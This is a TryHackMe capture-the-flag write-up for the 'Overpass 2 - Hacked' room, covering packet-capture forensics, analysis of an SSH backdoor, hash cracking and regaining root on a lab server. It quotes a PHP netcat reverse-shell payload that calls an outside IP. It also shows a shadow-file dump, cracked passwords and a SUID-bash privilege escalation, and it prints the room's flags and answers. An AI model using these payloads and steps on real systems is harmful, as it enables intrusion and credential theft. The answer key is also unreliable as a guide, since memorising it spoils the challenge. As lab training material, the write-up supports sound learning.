# TryHackMe Room: Overpass 2 - Hacked

Link: [Overpass 2 - Hacked](https://tryhackme.com/room/overpass2hacked)

## WriteUp

### Task 1  Forensics - Analyse the PCAP
## Overview

Overpass has been hacked! The SOC team (Paradox, congratulations on the promotion) noticed suspicious activity on a late night shift while looking at shibes, and managed to capture packets as the attack happened.

Can you work out how the attacker got in, and hack your way back into Overpass' production server?

Note: Although this room is a walkthrough, it expects familiarity with tools and Linux. I recommend learning basic Wireshark and completing [CC: Pentesting](https://tryhackme.com/room/ccpentesting) and [Learn Linux](https://tryhackme.com/room/zthlinux) as a bare minimum.  

md5sum of PCAP file: 11c3b2e9221865580295bc662c35c6dc

## Analysis 

First Download the Capture file from TryHackme Overpass 2 room there you will see the button named `Download Task File`  download it and after you download it open **Wireshark** that are preinstalled in kali linux open it.When wireshark is open go to File menu in Toolbar there you will see the option name `Open` or you can just press `Ctrl + O` there you will prompt to open a file so open the file that you Download from tryhackme.

When you open the file then you will see all the packets that are capture during the attack so now let's start analysis 

Q1: What was the URL of the page they used to upload a reverse shell?
```
First we have to filter our packets to http As there is so many packets there so we have to filter it so go to filter bar you can see this after the Toolbar and there write HTTP and press enter so then you will see all the packets that are related to http protocol

When your result is filter locate the packet that are use to upload a file name "upload.php" you can see this in the info tab of the packets so there you will find the url the attacker use to get the reverse shell.Attacker use POST method to that link to Upload its Payload to the server
````
A: /development/

Q2: What payload did the attacker use to gain access?
Hint: Include the PHP tags. Whole file content.
```
So Now we know which vulnerable area attack use to upload a reverse shell payload on the server. The attacker use upload.php function to upload a file name payload.php that contain some malicious php code that give the attacker a reverse shell so we can see the content/data of that packet to identify what that payload do to the system.

As we focus on the packet number 14 that are the packet contain upload.php function so you just have to see the data of that packet and you can see this to the bottom tab of the wireshark click on the packet all the packet data were shown in that tab scroll down to the content and focus on it and there you will see the php code inside that packet just copy that packet
```
A: `<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>`

Q3: What password did the attacker use to privesc?
Hint: A netcat reverse shell transmits everything in plaintext!
```
So we know which packet attack use to activate the reverse shell.If not so i recap you all the finding we do till then so we know which website directory attacker go and we also know which file they use to upload a payload so now attacker upload a working rev-shell payload uploaded but they did not give the rev-shell to the attacker except when attacker go to that file so attacker must go to that directory so then the php code execute on the server and after that attacker got the rev-shell to its system.So we just have to know which packet attacker send to visit that payload file and that is packet number 27.

We can see attacker send a GET request to /development/uploads/payload.php so after that attacker get the rev-shell and rev-shell are TCP connections so now we have to analyzes the TCP packet or we can remove all the filters and just view all the packet after the packet number 27 one by one so there is some packets we can see that contain some output that we can understan and the attacker use just a normal enumeration process use ls command for list all the directories and use python3 to get full pty shell so we can see that just view all the packet and in one packet we can see attacker use "su james" command and then shell prompt to enter the password and attacker use some password there we can see it 
```
A: whenevernoteartinstant

Q4: How did the attacker establish persistence?
```
As we continue our packet analysis and we can see all the activity attacker use to  get the better privilleges.Attacker use common methods like use "sudo -l" command and there attacker know the james user use all the command as sudo so attacker use this to see the content of linux shadow file with the following command "sudo cat /etc/shadow" and they are sucessfully see the content of that file so that means attacker have full privilleges to the overpass server.

After getting full privileged to the server attacker try to add a ssh backdoor to the server and we can see it in the packet when we move to the packets. In the packet number 121 attacker use gitclone command to clone some file to the server
```
A:  https://github.com/NinjaJc01/ssh-backdoor

Q5: Using the fasttrack wordlist, how many of the system passwords were crackable?
Hint: Did the attacker dump the shadowfile? Try cracking them yourself.
```
In the packet Number 114 attacker use "sudo cat /etc/shadow" to see the content of /etc/shadow file.We can also see the content of the file in wireshark bottom packet data tab so just copy all the shadow file content to the a file with any name you want and use john or hashcat to crack the password with the wordlist "fasttrack.txt"
Command:

$ john <shadow_file_here> --wordlist=fasttrack.txt
```
A: 4

==Here is a fun Tip about WireShark If you  just click on the packet where attacker interact with the bash rev-shell like that packet where attacker use "ls" command.Right Click on that packet and they will open a drop down menu there you will see  a option name "Follow" Hover into that option and you will see a Sub-drop down menu there you have to click on "TCP stream" or You can just use "Ctrl+Alt+Shift+T" on that packet and you will see all the bash command the attacker use in clean bash like format==


## Task 2  Research - Analyze the code

Now that you've found the code for the backdoor, it's time to analyze it.

Q1: What's the default hash for the backdoor?
Hint: Variable values!

```
In the previous Task we found out that attacker download a backdoor file from the github using the following link: https://github.com/NinjaJc01/ssh-backdoor

Now time to analyze that code go to that link there is a source code file name "main.go".There you will see a variable name "hash string" in that variable you will find the default hash for the backdoor
```
A: bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3

Q2: What's the hardcoded salt for the backdoor?
Hint: If you read the code, you can fairly quickly see what salt is provided to the function call.
```
Read all the code if you know little bit of programming you get the rough idea what the code do.Read all the way to the end and in the last line you will find the salt hash that are use in the backdoor.Just keep in mind the position of the salt variable in the functions that you seen above the code and you will find the salt hash for sure.
```
A:  1c362db832f3f864c8c2fe05f2002a05

Q3: What was the hash that the attacker used? - go back to the PCAP for this!
Hint: Reading the code, the -a or --hash flag can be used to supply a hash at runtime.
```
Now come back again to wireshark and start you packet analyses after the backdoor downloaded or you can Follow the attacker Bash TCP stream.In wire shark packet number 3479 you can see the attacker use "./backdoor" command and pass -a flag and after that attacker put its own hash.see it and submit it  
```
A: 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed

Q4: Crack the hash using rockyou and a cracking tool of your choice. What's the password?
Hint: It's salted, so make sure you use the correct mode. This also means crackstation etc won't work.
```
Now we have to crack the hash attacker used in the ssh backdoor so we just use any regular cracking tool for this but i use Hashcat there.So first we have to know what type of hash attacker use so do that we can use hash-identifier tool you can install it with the following command

$ sudo apt install hash-identifier

When this will installed open it using simple commmand "hash-identifier" and paste the hash in the tool they will show you the hash type

```
```

$ hash-identifier

   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed

Possible Hashs:
[+] SHA-512
[+] Whirlpool

Least Possible Hashs:
[+] SHA-512(HMAC)
[+] Whirlpool(HMAC)
----------------------------------------------------------------------------------
```

```As you can see this is SHA-512 hash but we can't crack it using online tool because they add a salt in that hash so we have to use our cracking tool like hashcat and john.

So now follow the following steps to crack that hash using hash cat 

Step 1: 
- In first step we have to find the hashcat code for sha512 with salt so to do that we use the following command

$ hashcat --help | grep sha512

This will show us all the hashcat code that are for sha512 but we have to pick   that one that have pass with salt because our hash use salt in it so we can use the following hash code   
```
```
1710 | sha512($pass.$salt)               | Raw Hash, Salted and/or Iterated
```

```
Now we Know which hashcat code we have use so now we can move to cracking the hash step

Step 2:

- In this step we fist have to to make two file one name is hash and the other one is cracked or you can use your own name of you choice.so in the hash file you have to write the hash you want to crack but you have to focus on the format because this is a salted hash so you have to write hash like the following format
```
```
Hash:Salt

So follow that format in our hash file we write the attacker hash and backdoor salt is like this 
```

```
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05
```

```
So that's it now we use the following hashcat command to crack that hash 

Command: 

$ hashcat -m 1710 -a 0 hash rockyou.txt -o cracked

-m    "This is use to specify hashcat cracking method i.e 1710 is for Sha512 with salt"

-a    "This is use to specify hashcat attacking mode i.e 0 is for wordlist attack"

hash  "This is the hash file we create and that contain our hash with salt"

rockyou.txt  "This is the cracking wordlist we use to crack that hash"

cracked   "This is the file where hashcat save the cracked password after successful cracking"

So That's it when the hashcat finish the cracking we found our cracked password in the cracked file just use "cat" command to see the cracked file content
```
A: november16


## Task 3  Attack - Get back in!
Now that the incident is investigated, Paradox needs someone to take control of the Overpass production server again.

There's flags on the box that Overpass can't afford to lose by formatting the server!

## Enumeration

Nmap scan Report

```
$ nmap -sCV 10.10.142.182
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-27 15:05 Pakistan Standard Time
Stats: 0:01:04 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.76% done; ETC: 15:06 (0:00:00 remaining)
Nmap scan report for 10.10.142.182
Host is up (0.17s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e4:3a:be:ed:ff:a7:02:d2:6a:d6:d0:bb:7f:38:5e:cb (RSA)
|   256 fc:6f:22:c2:13:4f:9c:62:4f:90:c9:3a:7e:77:d6:d4 (ECDSA)
|_  256 15:fd:40:0a:65:59:a9:b5:0e:57:1b:23:0a:96:63:05 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LOL Hacked
2222/tcp open  ssh     OpenSSH 8.2p1 Debian 4 (protocol 2.0)
| ssh-hostkey:
|_  2048 a2:a6:d2:18:79:e3:b0:20:a2:4f:aa:b6:ac:2e:6b:f2 (RSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.16 seconds

```

Q1: The attacker defaced the website. What message did they leave as a heading?
```
When go to overpass website in main page attacker change the page layout and use some picture and Change the title heading and after that they write a message "Secure your Servers!"
```
A: H4ck3d by CooctusClan

Q2: Using the information you've found previously, hack your way back in!
```
So we can see from our nmap scan report there is three open port one is for http and the remaining two have ssh service running on it and we know port 22 is open by the overpass management but port 2222 is open by attacker and that is a backdoor add by the attacker and we have complete our analysis and we know the password for the attacker ssh backdoor and we know they use username james so we can use attacker backdoor with all the information to get access to the system using the following command
```
```
$  ssh james@10.10.142.182 -p 2222

Where 
-p is to specify port number because they are not locate in well known port

Give him password you cracked in previous task using hashcat and you will login to the server
```

Q3: What's the user flag?
Hint: The backdoor! It only checks the password.
```
When you have access to the system go to home directory of james user and in there home directory you will find user.txt file that contain the flag submit it to THM
```
A: thm{d119b4fa8c497ddb0525f7ad200e6567}

Q4: What's the root flag?
Hint: Did the attacker leave a quick way for them to get root again without a password?
```
When we use find command to find some suid binaries with the following command 

$ find / -perm /4000 2>/dev/null

We found out that there is a file in the james home directory with the name ".suid_bash" and they are owned by root user so when we search bash on GTFObins we found out that if we use "bash -p" so we can get root access so now lets try this using what we have with the following command 

$ ./.suid_bash -p

And we got it we got the root access now go to root directory and read the root.txt flag
```
A: thm{d53b2684f169360bb9606c333873144d}